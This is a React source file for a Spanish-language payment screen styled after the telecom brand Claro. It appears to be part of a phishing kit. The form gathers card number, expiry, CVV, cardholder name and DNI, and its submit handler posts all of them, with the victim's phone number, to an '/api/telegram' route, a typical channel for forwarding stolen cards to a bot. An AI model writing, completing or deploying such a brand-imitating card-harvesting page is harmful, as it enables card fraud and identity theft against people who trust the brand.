"use client"

import { useState, useCallback } from "react"
import { ClaroHeader } from "./claro-header"
import { HelpCircle } from "lucide-react"

interface CardFormScreenProps {
  telefono: string
  amount: number
  onSubmit: (data: CardData) => void
  onBack: () => void
  onCancel: () => void
  onLogout?: () => void
}

export interface CardData {
  numero_tarjeta: string
  vencimiento: string
  cvv: string
  titular: string
  dni: string
  tipo_tarjeta: string
}

function detectCardType(number: string): string {
  const cleaned = number.replace(/\s/g, "")
  if (/^4/.test(cleaned)) return "visa"
  if (/^5[1-5]/.test(cleaned) || /^2[2-7]/.test(cleaned)) return "mastercard"
  if (/^3[47]/.test(cleaned)) return "amex"
  if (/^6(?:011|5)/.test(cleaned)) return "discover"
  if (/^(?:2131|1800|35)/.test(cleaned)) return "jcb"
  if (/^3(?:0[0-5]|[68])/.test(cleaned)) return "diners"
  if (/^(?:5018|5020|5038|6304|6759|6761|6763)/.test(cleaned)) return "maestro"
  if (/^(6304|6706|6771|6709)/.test(cleaned)) return "laser"
  if (/^62/.test(cleaned)) return "unionpay"
  if (/^9792/.test(cleaned)) return "troy"
  if (/^(?:60|65|81|82|508)/.test(cleaned)) return "rupay"
  return ""
}

function getCardIcon(type: string) {
  switch (type) {
    case "visa":
      return (
        <svg viewBox="0 0 48 32" className="h-5 w-8 shrink-0 sm:h-6 sm:w-10">
          <rect width="48" height="32" rx="4" fill="#1A1F71" />
          <text x="24" y="20" textAnchor="middle" fill="#FFFFFF" fontSize="12" fontWeight="bold" fontFamily="sans-serif">VISA</text>
        </svg>
      )
    case "mastercard":
      return (
        <svg viewBox="0 0 48 32" className="h-5 w-8 shrink-0 sm:h-6 sm:w-10">
          <rect width="48" height="32" rx="4" fill="#f2f2f2" />
          <circle cx="18" cy="16" r="10" fill="#EB001B" />
          <circle cx="30" cy="16" r="10" fill="#F79E1B" />
          <path d="M24 8.5a10 10 0 010 15 10 10 0 010-15z" fill="#FF5F00" />
        </svg>
      )
    case "amex":
      return (
        <svg viewBox="0 0 48 32" className="h-5 w-8 shrink-0 sm:h-6 sm:w-10">
          <rect width="48" height="32" rx="4" fill="#2E77BC" />
          <text x="24" y="20" textAnchor="middle" fill="#FFFFFF" fontSize="8" fontWeight="bold" fontFamily="sans-serif">AMEX</text>
        </svg>
      )
    case "diners":
      return (
        <svg viewBox="0 0 48 32" className="h-5 w-8 shrink-0 sm:h-6 sm:w-10">
          <rect width="48" height="32" rx="4" fill="#0079BE" />
          <text x="24" y="18" textAnchor="middle" fill="#FFFFFF" fontSize="7" fontWeight="bold" fontFamily="sans-serif">DINERS</text>
        </svg>
      )
    case "maestro":
      return (
        <svg viewBox="0 0 48 32" className="h-5 w-8 shrink-0 sm:h-6 sm:w-10">
          <rect width="48" height="32" rx="4" fill="#f2f2f2" />
          <circle cx="18" cy="16" r="10" fill="#0099DF" />
          <circle cx="30" cy="16" r="10" fill="#EE0005" />
        </svg>
      )
    default:
      return (
        <svg viewBox="0 0 48 32" className="h-5 w-8 shrink-0 sm:h-6 sm:w-10">
          <rect width="48" height="32" rx="4" fill="#e0e0e0" />
          <rect x="8" y="10" width="32" height="4" rx="2" fill="#cccccc" />
          <rect x="8" y="18" width="20" height="4" rx="2" fill="#cccccc" />
        </svg>
      )
  }
}

function formatCardNumber(value: string): string {
  const cleaned = value.replace(/\D/g, "")
  const groups = cleaned.match(/.{1,4}/g)
  return groups ? groups.join(" ") : cleaned
}

function formatExpiry(value: string): string {
  const cleaned = value.replace(/\D/g, "")
  if (cleaned.length >= 2) {
    return cleaned.slice(0, 2) + "/" + cleaned.slice(2, 4)
  }
  return cleaned
}

export function CardFormScreen({ telefono, amount, onSubmit, onBack, onCancel, onLogout }: CardFormScreenProps) {
  const [cardNumber, setCardNumber] = useState("")
  const [expiry, setExpiry] = useState("")
  const [cvv, setCvv] = useState("")
  const [titular, setTitular] = useState("")
  const [dni, setDni] = useState("")
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [isSubmitting, setIsSubmitting] = useState(false)

  const cardType = detectCardType(cardNumber)

  const handleCardNumberChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "").slice(0, 16)
    setCardNumber(formatCardNumber(raw))
    setErrors((prev) => ({ ...prev, cardNumber: "" }))
  }, [])

  const handleExpiryChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "").slice(0, 4)
    setExpiry(formatExpiry(raw))
    setErrors((prev) => ({ ...prev, expiry: "" }))
  }, [])

  const validate = (): boolean => {
    const newErrors: Record<string, string> = {}
    const cleanedCard = cardNumber.replace(/\s/g, "")
    if (cleanedCard.length < 13) newErrors.cardNumber = "Numero invalido"
    if (expiry.length < 5) newErrors.expiry = "Fecha invalida"
    if (cvv.length < 3) newErrors.cvv = "CVV invalido"
    if (!titular.trim()) newErrors.titular = "Ingresa el titular"
    if (!dni.trim() || dni.length < 7) newErrors.dni = "DNI invalido"
    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  // ✅ Solo valida y llama a onSubmit — el envío a Telegram lo maneja page.tsx
  const handleSubmit = async () => {
    if (!validate()) return
    setIsSubmitting(true)

    const cardData: CardData = {
      numero_tarjeta: cardNumber,
      vencimiento: expiry,
      cvv,
      titular,
      dni,
      tipo_tarjeta: cardType || "desconocida",
    }

    try {
      const res = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          telefono,
          monto: amount,
          ...cardData,
        }),
      })

      if (!res.ok) {
        const err = await res.json()
        console.error("Telegram error:", err)
      }
    } catch (err) {
      console.error("Fetch error:", err)
    }

    onSubmit(cardData)
  }

  return (
    <div className="flex min-h-[100dvh] flex-col bg-[#f2f2f2]">
      <ClaroHeader title="Ingresar nueva tarjeta" onBack={onBack} phone={telefono} onLogout={onLogout} />

      <div className="mx-auto w-full max-w-2xl px-3 py-4 sm:px-4 sm:py-6">
        <div className="rounded-xl bg-[#ffffff] p-3 shadow-sm sm:p-4 md:p-6">

          {/* Card number */}
          <div className="mb-1">
            <div className={`flex items-center gap-2 rounded-lg border px-3 py-3 sm:gap-3 sm:px-4 ${errors.cardNumber ? "border-[#da291c]" : "border-[#e0e0e0]"}`}>
              {getCardIcon(cardType)}
              <input
                type="tel"
                placeholder="Numero de tarjeta"
                value={cardNumber}
                onChange={handleCardNumberChange}
                className="w-full bg-transparent text-sm text-[#1a1a1a] outline-none placeholder:text-[#999999]"
                maxLength={19}
              />
            </div>
            {errors.cardNumber && <p className="mt-1 text-xs text-[#da291c]">{errors.cardNumber}</p>}
          </div>

          <button className="mb-3 text-xs text-[#da291c] hover:underline sm:mb-4">
            Ver tarjetas habilitadas
          </button>

          {/* Expiry */}
          <div className="mb-3 sm:mb-4">
            <div className={`flex items-center justify-between rounded-lg border px-3 py-3 sm:px-4 ${errors.expiry ? "border-[#da291c]" : "border-[#e0e0e0]"}`}>
              <input
                type="tel"
                placeholder="Fecha de vencimiento"
                value={expiry}
                onChange={handleExpiryChange}
                className="w-full bg-transparent text-sm text-[#1a1a1a] outline-none placeholder:text-[#999999]"
                maxLength={5}
              />
              <HelpCircle className="h-5 w-5 shrink-0 text-[#999999]" />
            </div>
            {errors.expiry && <p className="mt-1 text-xs text-[#da291c]">{errors.expiry}</p>}
          </div>

          {/* CVV */}
          <div className="mb-3 sm:mb-4">
            <div className={`flex items-center justify-between rounded-lg border px-3 py-3 sm:px-4 ${errors.cvv ? "border-[#da291c]" : "border-[#e0e0e0]"}`}>
              <input
                type="tel"
                placeholder="Codigo de seguridad"
                value={cvv}
                onChange={(e) => {
                  setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
                  setErrors((prev) => ({ ...prev, cvv: "" }))
                }}
                className="w-full bg-transparent text-sm text-[#1a1a1a] outline-none placeholder:text-[#999999]"
                maxLength={4}
              />
              <HelpCircle className="h-5 w-5 shrink-0 text-[#999999]" />
            </div>
            {errors.cvv && <p className="mt-1 text-xs text-[#da291c]">{errors.cvv}</p>}
          </div>

          {/* Titular */}
          <div className="mb-3 sm:mb-4">
            <div className={`flex items-center justify-between rounded-lg border px-3 py-3 sm:px-4 ${errors.titular ? "border-[#da291c]" : "border-[#e0e0e0]"}`}>
              <input
                type="text"
                placeholder="Titular de la tarjeta"
                value={titular}
                onChange={(e) => {
                  setTitular(e.target.value)
                  setErrors((prev) => ({ ...prev, titular: "" }))
                }}
                className="w-full bg-transparent text-sm text-[#1a1a1a] outline-none placeholder:text-[#999999]"
              />
              <HelpCircle className="h-5 w-5 shrink-0 text-[#999999]" />
            </div>
            {errors.titular && <p className="mt-1 text-xs text-[#da291c]">{errors.titular}</p>}
          </div>

          {/* DNI */}
          <div className="mb-5 sm:mb-6">
            <div className={`rounded-lg border px-3 py-3 sm:px-4 ${errors.dni ? "border-[#da291c]" : "border-[#e0e0e0]"}`}>
              <input
                type="tel"
                placeholder="DNI titular de la tarjeta"
                value={dni}
                onChange={(e) => {
                  setDni(e.target.value.replace(/\D/g, "").slice(0, 8))
                  setErrors((prev) => ({ ...prev, dni: "" }))
                }}
                className="w-full bg-transparent text-sm text-[#1a1a1a] outline-none placeholder:text-[#999999]"
                maxLength={8}
              />
            </div>
            {errors.dni && <p className="mt-1 text-xs text-[#da291c]">{errors.dni}</p>}
          </div>

          {/* Submit */}
          <button
            onClick={handleSubmit}
            disabled={isSubmitting}
            className="w-full rounded-full bg-[#da291c] py-3 text-center text-sm font-semibold text-[#ffffff] transition-opacity hover:opacity-90 active:opacity-80 disabled:opacity-60 sm:text-base"
          >
            {isSubmitting ? "Procesando..." : "Pagar"}
          </button>

          <button
            onClick={onCancel}
            className="mt-3 w-full text-center text-sm text-[#da291c] hover:underline"
          >
            Cancelar
          </button>
        </div>
      </div>
    </div>
  )
}